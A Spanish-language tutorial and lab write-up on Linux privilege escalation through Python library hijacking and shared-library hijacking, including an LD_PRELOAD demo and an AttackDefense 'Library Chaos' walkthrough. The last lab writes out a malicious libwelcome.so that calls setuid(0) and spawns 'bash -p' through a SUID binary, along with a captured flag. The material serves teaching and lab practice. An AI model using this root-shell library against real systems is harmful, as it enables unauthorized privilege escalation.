Python cuenta con una lista de directorios donde busca los módulos y paquetes cuando se intenta importar algo. Es una lista que incluye los directorios del sistema y los directorios locales donde están ubicados los scripts. Es útil para saber qué directorios están siendo considerados en la búsqueda de módulos y paquetes, lo que puede ayudar a diagnosticar problemas relacionados con la importación de módulos en tu entorno Python. En otras palabras, es como un “$PATH” que se utiliza para buscar, entre los directorios, los módulos que se están importando.

Para ver este “PATH”, se utiliza el siguiente comando:

```bash
python3 -c 'import sys; print(sys.path)'
```

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 4.png)

Cada directorio está entre comillas y separado por comas, el primero está vacío y corresponde al directorio actual de trabajo del usuario, es decir, en el que directorio en el que se encuentra el usuario.

En este caso, se está importando la librería **hashlib** y si se utiliza el comando “locate” para encontrar la ruta de su directorio, se puede ver que este está en el “PATH” de librerías para python, por lo que cuando se importe esta librería, el sistema buscará en este “PATH” entre cada ruta de izquierda a derecha hasta encontrar el paquete de hashlib.

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 5.png)

## Explotación de Python Library Hijacking

El riesgo está en la primer cadena vacía del “PATH” de librerías para python ya que esta hace referencia al directorio en el que se encuentra el script, de forma que el atacante podría “secuestrar” la ejecución del hashlib creando un hashlib.py en el ese directorio para que haga una función diferente a la esperada.

El atacante crea un script de python con el nombre “hashlib.py” en el directorio actual en el cual se importa la librería os para ejecutar un comando:

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 6.png)

Cuando el sistema haga la búsqueda del módulo hashlib, priorizará la búsqueda en el directorio donde se encuentra el script y ejecutará el falso hashlib.py creado por el atacante y como este está ejecutando el script como el usuario pepe, se le proporcionará una shell como el usuario pepe.

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 7.png)

### Modificar el archivo original

En lugar de crear un false hashlib.py en el directorio actual, también se podría intentar modificar el módulo principal, si este tiene permisos de escritura, se podría modificar para importar la librería os y ejecutar un comando

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 8.png)

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 9.png)

Al ejecutar nuevamente el script, se proporciona una shell como el usuario pepe.

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 10.png)

### Utilizar un directorio prioritario

Parecido al primer ejemplo, se podría crear un módulo falso tomando como directorio una ruta prioritaria a la ruta original del archivo, por ejemplo, si el directorio original del módulo se encuentra en “/usr/lib/python3/dist-packages”, se podría intentar crear un módulo falso en alguno de los directorios anteriores a ese.

![Untitled](/assets/Privesc/Python-Library-Hijacking/Untitled 11.png)

# Secuestro de la biblioteca de objetos compartidos enlazados dinámicamente
    
Las **bibliotecas compartidas** son archivos que contienen funciones y recursos utilizados por múltiples programas. Cuando un programa requiere una función de una biblioteca compartida, el sistema operativo busca la biblioteca y enlaza dinámicamente la función requerida durante la ejecución del programa. Sin embargo, si el sistema no encuentra la biblioteca en las rutas predeterminadas, puede buscarla en otros directorios.
    
Un atacante puede aprovechar esta situación creando una **biblioteca compartida maliciosa** con el mismo nombre que la biblioteca legítima y colocándola en un directorio donde el sistema la buscará. Cuando el programa intenta cargar la biblioteca, el sistema cargará la versión maliciosa en lugar de la legítima, permitiendo al atacante ejecutar código malicioso con los privilegios del programa víctima.
    
En esta clase, analizaremos cómo se lleva a cabo el secuestro de bibliotecas de objetos compartidos enlazados dinámicamente y cómo identificar situaciones en las que esta técnica puede ser aplicada.


### Más info:

- Links
    
    pakagesdebian - (”[https://packages.debian.org/sid/utils/uftrace](https://packages.debian.org/sid/utils/uftrace)”)
    
    ibm - (”[https://www.ibm.com/docs/es/psfa/7.1.0?topic=system-function-aggregate-signatures](https://www.ibm.com/docs/es/psfa/7.1.0?topic=system-function-aggregate-signatures)”)
    
    ibm - (”[https://www.ibm.com/docs/es/openxl-fortran-aix/17.1.0?topic=programs-dynamic-static-linking](https://www.ibm.com/docs/es/openxl-fortran-aix/17.1.0?topic=programs-dynamic-static-linking)”)
    

## Lab #1 - LD_PRELOAD

Para este lab se tiene un script en C que lo que hará es mostrar un número aleatorio:

```bash
{% raw %}
#include <stdio.h>
#include <time.h>
#include <stdlib.h>

int main(int argc, char const *argv[]) {
	srand(time(NULL));
	printf("%d\n", rand());
}
{% endraw %}
```

Para compilarlo, se usa el siguiente comando:

```bash
gcc random.c -o random
```

Para ver las librerías y funciones que se están utilizando, se usa el comando “uftrace”, esto se instala de la siguiente manera:

```bash
git clone https://github.com/namhyung/uftrace
cd uftrace
misc/install-deps.sh
./configure
make
make install
```

Se usará de la siguiente manera:

```bash
uftrace --force -a random
```

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled.png)

Esto muestra cómo se ejecuta el programa, qué funciones usa, etc.

### Secuestro de librerías

Para este ejemplo, se secuestrará la función “rand()”, es decir, se creará un “rand()” falso que tendrá una función diferente y se hará que el binario ejecute este en lugar del original.

Para que esto sea posible, la función falsa debe coincidir a nivel de firma con la original. Una firma normalmente contiene los siguientes elementos:

```bash
Nombre -> Argumentos -> Tipo de retorno
```

Para ver cómo se debe estructurar, se puede usar el manual:

```bash
man 3 rand
```

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 1.png)

Esta es la estructura que se debe usar para secuestrar la función “rand()”.

El función del programa falso es mostrar el número 42 de forma constante.

```bash
{% raw %}
int rand(void){
	return 42;
}
{% endraw %}
```

Ahora a la hora de ejecutar el programa, el enlazador dinámico cargará todas las librerías necesarias para que el programa funcione correctamente. El problema es que este enlazador dinámico funciona de una manera que tomará como prioritario todo lo que esté almacenado en la variable de entorno “LD_PRELOAD”. Entonces por ejemplo, se podría establecer una biblioteca compartida previamente compilada.

Para crear una biblioteca compartida, se usa el siguiente comando:

```bash
gcc -shared -fPIC trick.c -o trick
```

Y ahora si se almacena esta biblioteca compartida maliciosa en la variable de entorno LD_PRELOAD al ejecutar el binario “random”, se puede ver como ahora el valor resultado cambia:

```bash
LD_PRELOAD=./trick ./random
```

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 2.png)

Nota: No se podría secuestrar una librería si se estuviera utilizando un enlazador estático, es decir, que la librería estuviera incrustado en el código y no la busca externamente.

## Lab #2 - AttackDefense (Chaos)

Para este lab, se hará uso de la plataforma AttackDefense y se explotará la máquina “Library Chaos”.
Link de la web: 

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 3.png)

La idea será abusar del binario: “/usr/bin/welcome”.

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 4.png)

El binario tiene permisos SUID y el propietario es root pero otros pueden ejecutarlo. Al ejecutarlo se muestra un error al tratar de cargar la librería “libwelcome.so”, y al utilizar el comando ldd, se ve que está tratando de cargar esa librería misma pero se muestra como no encontrada:

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 5.png)

Se podría intentar usar el “LD_PRELOAD” pero en este caso no funcionará, otra opción sería ver si el directorio “/etc/ld.so.conf.d” tiene permisos de escritura ya que si fuera el caso, se podría añadir una configuración para indicarle la ruta a la que debe atender para encontrar la librería que busca, sin embargo, este tampoco es el caso:

```bash
ls -l /etc/ | grep "ls.so.conf.d"
```

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 6.png)

Aún así se podría ver los archivos de configuración existentes dentro de ese directorio para ver a qué rutas van.

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 7.png)

El archivo “custom.conf” apunta al directorio “lib” dentro del home del usuario “student”, esta ruta no existe pero se puede crear y dentro de él, crear, ahora sí, una librería “libwelcome.so” maliciosa para cambiar el UID del usuario al de root aprovechando que el binario se ejecuta con permisos SUID.

```bash
cd
mkdir lib
cd lib
vi test.c
```

El contenido de test.c será lo siguiente:

*Nota: Se usa el nombre de función “welcome” ya que es la función a la que se está llamando en el binario "welcome”.*

```bash
{% raw %}
#include <stdio.h>
#include <unistd.h>

int welcome(){
	setuid(0);
	setgid(0);
	system("bash -p");
	return 0;
}
{% endraw %}
```

Ahora hay que compilar el archivo como una librería compartida llamada “libwelcome.so” e insertarlo en el directorio “lib”, para esto, se usa el siguiente comando:

```bash
gcc -shared -fPIC test.c -o libwelcome.so
```

Una vez hecho, esto, al ejecutar el binario nuevamente, este atenderá a la librería creada y cambiará el UID del usuario a 0, es decir, como root.

![Untitled](/assets/Privesc/Shared-Library-Hijacking/Untitled 8.png)

flag: 5b8dc7e64c56a312bedc5257e323c2fc
